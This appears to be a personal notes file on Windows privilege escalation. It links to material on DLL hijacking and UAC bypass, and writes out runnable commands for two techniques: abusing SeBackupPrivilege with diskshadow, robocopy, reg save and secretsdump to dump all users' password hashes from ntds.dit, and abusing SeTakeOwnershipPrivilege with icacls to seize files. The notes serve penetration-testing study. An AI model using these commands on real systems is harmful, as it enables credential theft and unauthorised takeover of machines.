### TODO:
1. Learn how to make exe's using windows.h
2. Learn how to make DLL's https://www.youtube.com/watch?v=3eROsG_WNpE&t=25s https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/dll-hijacking#your-own
3. Learn how to manipulate process memory using windows API and try to implement https://github.com/AlienX2001/PSBits/tree/master/EnableAllParentPrivileges
4. Implementing https://daniels-it-blog.blogspot.com/2020/07/uac-bypass-via-dll-hijacking-and-mock.html?m=1

## usually you just find services worth exploiting and then exploit them do priv esc but for a reference and as a compilation of my past experiences here is the notes
- first enumerate and gather all info
- using winpeas look for files/folders owned by system and we also have perms to read/write or execute refer to winpeas docs for the full form of codes displayed by winpeas over files/folders
- we can leverage services which create proccess with system privs and hence get a system shell

## If we need to enable all privs listed in a cmd shell session then we can follow these tweets and repos
https://twitter.com/0gtweet/status/1479813175046516738?t=x-BDnA-QT9hQ2eIbEw4P8g&s=19 and https://github.com/gtworek/PSBits/tree/master/EnableAllParentPrivileges

## escalation through certain privs
### SeBackupPrivilege and SeRestorePrivilege
If we have these 2 privs then what we can do is, we can create a backup of the C drive into some other drive of our choice(E drive here), this will also result in forming the backup of the C:\windows\ntds which we can use along with the master key extracted from system registry hive to decrypt the ntds file to get hashes of all users on that machine.
This can be done by 1st copying this into a txt file
```
set verbose onX
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% E:X
end backupX
```
and then using diskshadow to create a shadow copy(backup) of ther C drive via `diskshadow /s FILENAME.txt` FILENAME being the filename of the above txt file. Now our shadow copy is ready. Now we will use robocopy to copy the ntds from the E drive to our working directory via `robocopy /b E:\Windows\ntds . ntds.dit`. Now we have a copy of ntds, and are in need of the master key which needs the system registery hive, which can by saved via `reg save hklm\system "FULL PATH\system"` now we will transfer the ntds.dit file and system save file to our kali machine and use secretsdump's LOCAL mode to decrypt the ntds via `secretsdump.py LOCAL -ntds "PATH TO NTDS FILE" -system "PATH TO SYSTEM FILE"`

### SeTakeOwnershipPrivilege
Using this priv, we can simply take ownership of any file we want access to, and by taking ownership, we have full control over the object. We can take ownership of any object using icacls via 1st `icacls "FILENAME" /setowner "USERNAME"` and then `icacls "FILE NAME" /grant "USERNAME":F`

